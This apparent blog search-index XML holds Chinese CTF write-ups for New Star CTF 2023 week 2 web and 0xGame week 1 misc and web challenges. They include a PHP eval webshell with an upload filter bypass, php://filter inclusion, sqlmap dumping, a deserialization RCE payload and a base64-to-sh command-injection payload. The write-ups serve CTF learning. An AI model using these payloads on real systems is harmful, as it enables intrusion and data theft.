<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>New Star CTF 2023 week2|web</title>
    <link href="/2023/10/11/New-Star-CTF-2023-week2-web/"/>
    <url>/2023/10/11/New-Star-CTF-2023-week2-web/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近New Star CTF和0xGame都在打，就web而言还是New Star CTF的更加简单和基础，0xGame的质量更高，题目更难。</p><h1 id="游戏高手"><a href="#游戏高手" class="headerlink" title="游戏高手"></a>游戏高手</h1><p>打开题目，发现是一个js游戏</p><p><img src="/2023/10/11/New-Star-CTF-2023-week2-web/image-20231011232111002.png" alt="image-20231011232111002"></p><p>看到这种题目就先想到会不会是前端的js代码修改一下就行，这里就很奇怪，不知道火狐怎么改前端的js代码，只会在谷歌改，但是谷歌没设置代理，后续抓不了包，所以决定在burp的内置浏览器上操作，内置浏览器也是谷歌。</p><p><img src="/2023/10/11/New-Star-CTF-2023-week2-web/image-20231011232618686.png" alt="image-20231011232618686"></p><p>分析一下主要代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">gameover</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">if</span>(gameScore &gt; <span class="hljs-number">100000</span>)&#123;<span class="hljs-comment">//分数要超过1000000，我们可以修改来降低触发难度</span><br>        <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>        xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;POST&quot;</span>, <span class="hljs-string">&quot;/api.php&quot;</span>, <span class="hljs-literal">true</span>);<span class="hljs-comment">//用post方法来提交参数，用于后端检测</span><br>        xhr.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/json&quot;</span>);<br>        xhr.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">if</span> (xhr.<span class="hljs-property">readyState</span> === <span class="hljs-number">4</span> &amp;&amp; xhr.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) &#123;<br>            <span class="hljs-keyword">var</span> response = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(xhr.<span class="hljs-property">responseText</span>);<br>            <span class="hljs-title function_">alert</span>(response.<span class="hljs-property">message</span>);<br>        &#125;<br>        &#125;;<br>        <span class="hljs-keyword">var</span> data = &#123;<br>            <span class="hljs-attr">score</span>: gameScore,<span class="hljs-comment">//后端得到的代码，也是我们需要抓包后修改的post里的内容</span><br>        &#125;;<br>        xhr.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));<span class="hljs-comment">//后端上传验证</span><br>    &#125;<br><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;成绩：&quot;</span>+gameScore);<span class="hljs-comment">//前端返回界面，没什么用</span><br>gameScore=<span class="hljs-number">0</span>;  <br>curPhase =<span class="hljs-variable constant_">PHASE_READY</span>;  <br>hero = <span class="hljs-literal">null</span>;<br>hero = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hero</span>();      <br>&#125;<br></code></pre></td></tr></table></figure><p>我们知道了之后，就把分数改为10，然后在超过10分的时候自杀来抓包</p><p><img src="/2023/10/11/New-Star-CTF-2023-week2-web/image-20231011233909076.png" alt="image-20231011233909076"></p><p>可以看到后端验证的score上传点，我们改为比100000大的数字再重发就行</p><p><img src="/2023/10/11/New-Star-CTF-2023-week2-web/image-20231011234006280.png" alt="image-20231011234006280"></p><p>得到了flag：flag{751524ef-f0b1-4356-a62a-6fabe8608a72}</p><h1 id="upload-again"><a href="#upload-again" class="headerlink" title="upload again!"></a>upload again!</h1><p>打开环境，发现可能存在文件上传漏洞，我们先传一个图片试试</p><p><img src="/2023/10/11/New-Star-CTF-2023-week2-web/image-20231012102343714.png" alt="image-20231012102343714"></p><p>发现上传成功，然后试一下图片码上传</p><p><img src="/2023/10/11/New-Star-CTF-2023-week2-web/image-20231012102839253.png" alt="image-20231012102839253"></p><p>发现可能有内容检测，我们再试一下到底过滤了什么，最后发现过滤了‘&lt;?’</p><p><img src="/2023/10/11/New-Star-CTF-2023-week2-web/image-20231012103040181.png" alt="image-20231012103040181"></p><p>那就试试绕过，用以下代码试一下（php&lt;7）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?cript language=<span class="hljs-string">&quot;php&quot;</span>&gt;<br> <span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[2333]);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="/2023/10/11/New-Star-CTF-2023-week2-web/image-20231012103251598.png" alt="image-20231012103251598"></p><p>发现上传成功，接下来如果直接访问这个文件地址是不行的，因为不是php文件，不能代码执行。可以用的方法，要么存在文件包含漏洞来包含这个文件，要么就上传.htaccess来把.gif文件解析成php文件，然后进行代码执行，如果都不可以，那么就只能试试其它方法了，我们先试试上传.htaccess文件</p><p>文件内容如下</p><p><img src="/2023/10/11/New-Star-CTF-2023-week2-web/image-20231012103533210.png" alt="image-20231012103533210"></p><p>表示我们将目录下的.gif文件都解析成php</p><p>接下来上传</p><p><img src="/2023/10/11/New-Star-CTF-2023-week2-web/image-20231012103616908.png" alt="image-20231012103616908"></p><p>发现可以，那我们再访问之前图片码b.gif的路径，看看有没有解析成php文件</p><p><img src="/2023/10/11/New-Star-CTF-2023-week2-web/image-20231012103734629.png" alt="image-20231012103734629"></p><p>发现解析成功了，最后就是一句话木马的执行了</p><p><img src="/2023/10/11/New-Star-CTF-2023-week2-web/image-20231012103922671.png" alt="image-20231012103922671"></p><p>得到flag：flag{ef639d8b-86d5-46e2-846e-9bed9cfd04ab}</p><h1 id="include-0。0"><a href="#include-0。0" class="headerlink" title="[include 0。0]"></a>[include 0。0]</h1><p><img src="/2023/10/11/New-Star-CTF-2023-week2-web/image-20231012201943059.png" alt="image-20231012201943059"></p><p>文件包含漏洞，用php伪协议，但过滤器要使用别的（之后打算出一期专门的php伪协议绕过）</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">php://<span class="hljs-built_in">filter</span>/<span class="hljs-keyword">read</span>=convert.<span class="hljs-built_in">iconv</span>.utf-<span class="hljs-number">8</span>.utf-<span class="hljs-number">16</span><span class="hljs-keyword">le</span>/resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="/2023/10/11/New-Star-CTF-2023-week2-web/image-20231012202309400.png" alt="image-20231012202309400"></p><p>flag{fc5f9e15-f502-4218-8390-15bde5613dfd}</p><h1 id="ez-sql"><a href="#ez-sql" class="headerlink" title="[ez_sql]"></a>[ez_sql]</h1><p><img src="/2023/10/11/New-Star-CTF-2023-week2-web/image-20231012202408760.png" alt="image-20231012202408760"></p><p>判断sql注入点是get传参的id，先去试一下sqlmap可不可以</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit">sqlmap -u &quot;http://b69a0412<span class="hljs-string">-980</span>f<span class="hljs-string">-42</span>ba-adf3<span class="hljs-string">-72</span>a3aa95b005.node4.buuoj.cn:81/?id=TMP0919&quot;<br></code></pre></td></tr></table></figure><p><img src="/2023/10/11/New-Star-CTF-2023-week2-web/image-20231012202739232.png" alt="image-20231012202739232"></p><p><img src="/2023/10/11/New-Star-CTF-2023-week2-web/image-20231012202816937.png" alt="image-20231012202816937"></p><p>发现注入成功，接下来爆数据库</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit">sqlmap -u &quot;http://b69a0412<span class="hljs-string">-980</span>f<span class="hljs-string">-42</span>ba-adf3<span class="hljs-string">-72</span>a3aa95b005.node4.buuoj.cn:81/?id=TMP0919&quot; -dbs<br></code></pre></td></tr></table></figure><p><img src="/2023/10/11/New-Star-CTF-2023-week2-web/image-20231012202956531.png" alt="image-20231012202956531"></p><p>发现6个数据库名，判断flag在ctf这个数据库当中，接下来爆数据库的表名</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit">sqlmap -u &quot;http://b69a0412<span class="hljs-string">-980</span>f<span class="hljs-string">-42</span>ba-adf3<span class="hljs-string">-72</span>a3aa95b005.node4.buuoj.cn:81/?id=TMP0919&quot; -D ctf --tables<br></code></pre></td></tr></table></figure><p><img src="/2023/10/11/New-Star-CTF-2023-week2-web/image-20231012203235151.png" alt="image-20231012203235151"></p><p>发现flag存在的表名，那么接下来爆字段</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">sqlmap -u <span class="hljs-string">&quot;http://b69a0412-980f-42ba-adf3-72a3aa95b005.node4.buuoj.cn:81/?id=TMP0919&quot;</span> -D ctf -<span class="hljs-built_in">T</span> here_is_flag --<span class="hljs-built_in">columns</span> <br></code></pre></td></tr></table></figure><p><img src="/2023/10/11/New-Star-CTF-2023-week2-web/image-20231012203403010.png" alt="image-20231012203403010"></p><p>发现字段是flag，接下来就是直接看flag了</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">sqlmap</span> <span class="hljs-operator">-</span><span class="hljs-variable">u</span> <span class="hljs-string">&quot;http://b69a0412-980f-42ba-adf3-72a3aa95b005.node4.buuoj.cn:81/?id=TMP0919&quot;</span> <span class="hljs-operator">-</span><span class="hljs-built_in">D</span> <span class="hljs-variable">ctf</span> <span class="hljs-operator">-</span><span class="hljs-variable">T</span> <span class="hljs-type">here_is</span><span class="hljs-type">_flag</span> <span class="hljs-operator">-</span><span class="hljs-built_in">C</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">--</span><span class="hljs-variable">dump</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/11/New-Star-CTF-2023-week2-web/image-20231012203509772.png" alt="image-20231012203509772"></p><p>flag{2606401b-f0a1-41c2-b889-cfac8910bdd7}</p><p>成功得到flag</p><h1 id="Unserialize"><a href="#Unserialize" class="headerlink" title="[Unserialize]"></a>[Unserialize]</h1><p><img src="/2023/10/11/New-Star-CTF-2023-week2-web/image-20231012203655366.png" alt="image-20231012203655366"></p><p>是php反序列化题和绕过，最后看flag的时候可以尝试用sort代替cat</p><p>整体思路就是对this-&gt;cmd赋值，然后反序列化时触发__destruct魔术方法，然后成功命令执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// Maybe you need learn some knowledge about deserialize?</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;cmd=<span class="hljs-string">&quot;sort /th1s_1s_fffflllll4444aaaggggg&quot;</span>;<span class="hljs-comment">//cat th1s_1s_fffflllll4444aaaggggg</span><br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">evil</span>();<br><span class="hljs-keyword">print</span> (<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>)));<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//O%3A4%3A%22evil%22%3A1%3A%7Bs%3A9%3A%22%00evil%00cmd%22%3Bs%3A35%3A%22sort+%2Fth1s_1s_fffflllll4444aaaggggg%22%3B%7D</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/11/New-Star-CTF-2023-week2-web/image-20231012204013589.png" alt="image-20231012204013589"></p><p>flag{297f5fb0-c3f5-4521-a3db-cf535ba3b8c1}</p><h1 id="R-C-E"><a href="#R-C-E" class="headerlink" title="[R!!C!!E!!]"></a>[R!!C!!E!!]</h1><p>打开题目环境</p><p><img src="/2023/10/11/New-Star-CTF-2023-week2-web/image-20231014180331531.png" alt="image-20231014180331531"></p><p>提示有泄露，那就先目录扫描一下用dirmap</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">python</span> <span class="hljs-keyword">dirmap</span>.py -u https:<span class="hljs-comment">//......... -lcf</span><br></code></pre></td></tr></table></figure><p>扫出来有.git&#x2F;config文件，首先考虑的是git源码泄露，所以先用githack来爬一下源码</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> github.<span class="hljs-keyword">py</span> <span class="hljs-keyword">python</span> GitHack.<span class="hljs-keyword">py</span> http://www.openssl.org/.git/<br></code></pre></td></tr></table></figure><p><img src="/2023/10/11/New-Star-CTF-2023-week2-web/image-20231014180818019.png" alt="image-20231014180818019"></p><p>发现可疑文件bo0g1pop.php，先打开来看看</p><p><img src="/2023/10/11/New-Star-CTF-2023-week2-web/image-20231014180856547.png" alt="image-20231014180856547"></p><p>经典rce无参绕过</p><p>**getallheaders()**：获取所有 HTTP 请求标头，是apache_request_headers()的别名函数，但是该函数只能在Apache环境下使用<br>传入?code&#x3D;print_r(getallheaders());，数组返回 HTTP 请求头</p><p>eset()将一个数组的内部指针重置到首位，并返回第一个元素的值<br>end()将一个数组的内部指针移动到数组的最后一个元素所在的位置，并返回最后一个元素的值<br>prev()移动数组指针到上一位，返回该位的值，当该位没有元素或是空数组时返回false<br>next()移动数组指针到下一位，返回该位的值，当该位没有元素或是空数组时返回false<br>key()返回当前指针所指向的元素的键，当指针所指的那一位没有元素返回null，空数组返回null<br>current()返回当前数组指针所指向的值，指针移动超出了数组的末尾或数组为空时返回false<br>each()返回当前指针所指的元素的值和键，并且移动指针到下一位<br>我们先打印一下请求头</p><p><img src="/2023/10/11/New-Star-CTF-2023-week2-web/image-20231014181309496.png" alt="image-20231014181309496"></p><p>发现只有第二个请求头可以改，所以要用next指向第二个请求头</p><p><img src="/2023/10/11/New-Star-CTF-2023-week2-web/image-20231014181441370.png" alt="image-20231014181441370"></p><p>发现成功了，接下来就是修改第二个请求头，呀就是user-agent的内容，变成一个可执行的linux命令</p><p><img src="/2023/10/11/New-Star-CTF-2023-week2-web/image-20231014181746066.png" alt="image-20231014181746066"></p><p>只后就直接看flag了</p><p><img src="/2023/10/11/New-Star-CTF-2023-week2-web/image-20231014181822118.png" alt="image-20231014181822118"></p><p><code> </code>flag{cec09f13-bc48-403a-9ecd-89d538cfa6aa}</p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>0xGame Week1 misc&amp;web</title>
    <link href="/2023/10/11/0xGame-Week1-misc-web/"/>
    <url>/2023/10/11/0xGame-Week1-misc-web/</url>
    
    <content type="html"><![CDATA[<h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="signin"><a href="#signin" class="headerlink" title="[signin]"></a>[signin]</h3><p><img src="/2023/10/11/0xGame-Week1-misc-web/1.png" alt="image.png"></p><p>去大厨解密</p><p><img src="/2023/10/11/0xGame-Week1-misc-web/2.png" alt="image.png"></p><p>0xGame{Welc0me_To_0xGame2023!!}</p><h3 id="重生之我在教学楼打cs"><a href="#重生之我在教学楼打cs" class="headerlink" title="[重生之我在教学楼打cs]"></a>[重生之我在教学楼打cs]</h3><p>下载一个cs1.6的游戏，把地图添加进去，打开。</p><p>根据提示：一眼”鼎”真，flag也许就在脚下。结合地图中有鼎，经过对鼎仔细的观察发现</p><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696173700248-81a56432-2aae-4080-96c1-cbaf2461834d.jpeg" alt="83af31c5270b958469b4d3f322199e2.jpg"></p><p>0xGame{CS_very_good}</p><h3 id="shark-shark"><a href="#shark-shark" class="headerlink" title="[shark shark]"></a>[shark shark]</h3><p>打开流量包</p><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696173783135-c22b1251-f11e-4c96-9046-c14bb710c514.png" alt="image.png"></p><p>发现压缩包文件，提取出来，发现解压要密码</p><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696173810955-1a6e9357-730c-4986-a104-1ea5e5ba1138.png" alt="image.png"></p><p>在第0流找到了密码very_safe_password,解压出来一个flag.txt</p><p><img src="/2023/10/11/0xGame-Week1-misc-web/image-20231011145345693.png" alt="image-20231011145345693"></p><p>0xGame{7a504dab-ada6-4c41-adb3-0d1530098cd4}</p><h3 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="[hide and seek]"></a>[hide and seek]</h3><p>根据题目提示是用steghide隐藏的，那我们就要用steghide来解，但是不知道密码，所以先用stegseek来爆破密码。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">stegseek</span> <span class="hljs-number">1</span>.jpg &lt;密码.txt&gt;<br></code></pre></td></tr></table></figure><p>不加密码文件默认用kali自带的rocky.txt文件进行爆破。如果找不到rocky.txt文件，在kali终端输入wordlists,解压一下rocky.txt就行</p><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696174179728-27818d72-9928-4ba2-8309-9e134b84626a.png" alt="image.png"></p><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696174191304-c98a2752-9826-4c61-ac65-0b6d1463db4e.png" alt="image.png"></p><p>0xGame{Just_h1de_and_S33k}</p><h3 id="least-and-most"><a href="#least-and-most" class="headerlink" title="[least and most]"></a>[least and most]</h3><p>先用zsteg得到flag前半段</p><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696174271232-760e7ae9-b004-4f7c-af92-137baaa80527.png" alt="image.png"></p><p>0xGame{lsb_com</p><p>再msb隐写得到后半段</p><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696174347312-a22c00d5-b4d6-4425-ab52-312224cee5c5.png" alt="image.png"></p><p>bined_wi th_msb}</p><p>0xGame{lsb_combined_wi th_msb}</p><h3 id="another-signin"><a href="#another-signin" class="headerlink" title="[another signin]"></a>[another signin]</h3><p>一题区块链交易的娱乐题</p><p>题目给出了:</p><p>题目(提供源码，nc访问) 124.220.8.243:20000</p><p>rpc(货币节点，添加至metamask) 124.220.8.243:8545</p><p>水龙头(提供货币，浏览器访问) 124.220.8.243:8080</p><p>其中rpc要用matemask（谷歌插件）访问</p><p>先用nc看题目</p><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696174529602-65e436c3-ee90-4691-9c26-286bcceca2c9.png" alt="image.png"></p><p>大概的意思就是要完成一些任务，然后给你flag，先创建一个账户</p><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696174590417-aacd864b-a929-431a-9f0e-39ad6ede520f.png" alt="image.png"></p><p>提示要充钱</p><p>就用浏览器打开水龙头地址去给账户充钱124.220.8.243:8080</p><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696174671747-3d378005-94a8-402f-b118-aae62ff9a74f.png"></p><p>输入 0xdAC4E085939DcD76e5CfBE22D7FeAEF50000c1Bc</p><p>接着我们来到第2步</p><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696174739659-d13e7fb1-63c2-4042-968c-865e15919b8e.png" alt="image.png"></p><p>给了我们交易地址和交易hash</p><p>先输入4看一下源码</p><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696174768627-8f63385a-2520-4410-979c-431428a53c1a.png" alt="image.png"></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs csharp">pragma solidity <span class="hljs-number">0.8</span><span class="hljs-number">.9</span>;<br><br>contract Greeter &#123;<br>    <span class="hljs-built_in">string</span> greeting;<br><br>    constructor(<span class="hljs-built_in">string</span> memory _greeting) &#123;<br>        greeting = _greeting;<br>    &#125;<br><br>    <span class="hljs-function">function <span class="hljs-title">greet</span>() <span class="hljs-keyword">public</span> view <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-built_in">string</span> memory</span>)</span> &#123;<br>        <span class="hljs-keyword">return</span> greeting;<br>    &#125;<br><br>    <span class="hljs-function">function <span class="hljs-title">setGreeting</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> memory _greeting</span>) <span class="hljs-keyword">public</span></span> &#123;<br>        greeting = _greeting;<br>    &#125;<br><br>    <span class="hljs-function">function <span class="hljs-title">isSolved</span>() <span class="hljs-keyword">public</span> view <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-built_in">bool</span></span>)</span> &#123;<br>        <span class="hljs-built_in">string</span> memory expected = <span class="hljs-string">&quot;Love0xGame&quot;</span>;<br>        <span class="hljs-keyword">return</span> keccak256(abi.encodePacked(expected)) == keccak256(abi.encodePacked(greeting));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>可以看到我们需要满足keccak256(abi.encodePacked(expected)) &#x3D;&#x3D; keccak256(abi.encodePacked(greeting));但expexted已经是Love0xGame，所以我们需要让greeting也是Love0xGame</p><p>打开matemask</p><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696174852670-640d9b85-c6fc-4a7f-b1a7-1293ed7c10b9.png" alt="image.png"></p><p>添加网络，其中网络名称随便写，rpc填题目的第二个rpc地址，链id填错会告诉你正确的，照着填就行，货币符号自己随便。</p><p>在浏览器搜索remix并打开</p><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696174973663-40cd57c1-9b2c-41c3-8381-00e3b61ea5ff.png" alt="image.png"></p><p>将之前得到的源码复制进去</p><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696175007761-f87a8dbf-9bca-4cb2-8c5b-d0590d6b14da.png" alt="image.png"></p><p>然后选择Injected Provider - MetaMask，这边注意networks的id是否一样，然后在At Address中输入前面的合约地址：0x4a9D3ABB3Ac6E3312a76f521B35f7b4c804Dc3dE</p><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696175111552-19419dc8-27a4-48b9-af54-1f291333ba88.png" alt="image.png"></p><p>下面填Love0xGame</p><p>然后点击setGreeting</p><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696175178492-50152867-3460-4219-ba7e-e41dc4c15870.png" alt="image.png"></p><p>看到已经成功</p><p>最后在题目那边输入3，填写创建账号的token，得到flag</p><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696175249320-05da9aa3-9cdd-485e-b95e-ea4150acbd7f.png" alt="image.png"></p><p>0xGame{a4a1e006-42f1-44f9-a4c5-6c712a930664}</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Ping"><a href="#Ping" class="headerlink" title="[Ping]"></a>[Ping]</h3><p>用burp抓包</p><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696169275629-69c693d9-9d6a-4e6a-8b5e-6ad36e282524.png" alt="image.png"></p><p>发现过滤了空格和&#x2F;，用${IFS}代替空格，再利用base64绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">payload：ip=127.0.0.1|<span class="hljs-built_in">echo</span><span class="hljs-variable">$&#123;IFS&#125;</span><span class="hljs-string">&#x27;Y2F0IC4uLy4uLy4uL2ZsYWc=&#x27;</span><span class="hljs-variable">$&#123;IFS&#125;</span>|<span class="hljs-variable">$&#123;IFS&#125;</span><span class="hljs-built_in">base64</span><span class="hljs-variable">$&#123;IFS&#125;</span>-d<span class="hljs-variable">$&#123;IFS&#125;</span>|<span class="hljs-variable">$&#123;IFS&#125;</span>sh<br></code></pre></td></tr></table></figure><p>0xGame{19c71976-d7d8-4ab8-9ea5-6ea3800f59f6}</p><h3 id="signin-1"><a href="#signin-1" class="headerlink" title="[signin]"></a>[signin]</h3><p>在main.js文件里</p><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696170581472-535d02e2-cf1c-40fa-8f94-f34a9fdc6cde.png" alt="image.png"></p><p>0xGame{c788fa80-2184-429f-b410-48cb8e2de0ff}</p><h3 id="babyphp"><a href="#babyphp" class="headerlink" title="[babyphp]"></a>[babyphp]</h3><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696170713719-92ea8d0f-fbb7-449e-92a5-e5fd2b01b09b.png" alt="image.png"></p><p>参数a和参数b为弱比较md5绕过，c用%00截断绕过，name用php伪协议绕过</p><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696171034522-ed8b8bec-bc8c-40e1-ac3f-3fa087e108e1.png" alt="image.png"></p><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696171196476-825aaf44-59e9-4ff3-bc4e-ca27ead2223c.png" alt="image.png"></p><p>0xGame{43bb3e24-0824-48cb-95d0-c471540c0953}</p><h3 id="Hello-HTTP"><a href="#Hello-HTTP" class="headerlink" title="[Hello HTTP]"></a>[Hello HTTP]</h3><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696171239593-0dfce7b1-de79-472c-a5e1-f8d56c8192cd.png" alt="image.png"></p><p>用get传参query&#x3D;ctf</p><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696171275584-18841eb5-735d-44c4-946b-c2276cf9714c.png" alt="image.png"></p><p>post传参action&#x3D;getflag</p><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696171307940-65f01384-d98d-425e-9a9d-829b515f7460.png" alt="image.png"></p><p>更改cookie</p><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696171361853-9ef647e7-b723-4bf0-8b65-b2656d457e15.png" alt="image.png"></p><p>伪造请求ip</p><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696171404438-0eb2486a-339e-461a-b97e-f5f64beea8a9.png" alt="image.png"></p><p>更改user-agent</p><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696171441446-073e91ba-c0d2-4988-aeab-a95199d15fbd.png" alt="image.png"></p><p>更改Refere</p><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696171478405-d2f8908f-f6ea-4d2e-838f-1a6751405a45.png" alt="image.png"></p><p>0xGame{2c1a10fb-921e-4250-820f-5ce36940b8b5}</p><h3 id="repo-leak"><a href="#repo-leak" class="headerlink" title="[repo_leak]"></a>[repo_leak]</h3><p>打开环境</p><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696248325012-1b9bbcfe-eee0-49aa-bbee-c5fca42296d1.png" alt="image.png"></p><p>提示是用git来进行版本控制的，先用dirmap目录扫描一下，看一下存不存在git源码泄露</p><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696248437722-f253b8a6-1009-4d5c-b284-e6729e2fb3a5.png" alt="image.png"></p><p>发现好多git，确定存在git泄露</p><p>github安装相关工具：githacker</p><p>用githacker下载网页的源码</p><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696248528004-85084e87-eeea-41bd-aaf6-93e9c515227a.png" alt="image.png"></p><p>进入result目录下</p><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696248688891-a6c4ccc6-2da9-4007-90b2-7928a4428da6.png" alt="image.png"></p><p>放现git目录(隐藏的目录用ls -a显示)确实被我们拿到了，进入git目录，用git log查看文件上传的日志</p><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696249591880-268f847a-723e-41b6-96e0-ad48183147c4.png" alt="image.png"></p><p>发现flag被上传，记录下它的hash：8a5b670558921bd232d75b29542492f00698298b</p><p>接下来利用上传的hash查看上传的文件内容</p><p>git show 8a5b670558921bd232d75b29542492f00698298b</p><p><img src="/2023/10/11/0xGame-Week1-misc-web/1696249727385-5b0769f4-3964-4e87-ad32-46c057affd10.png" 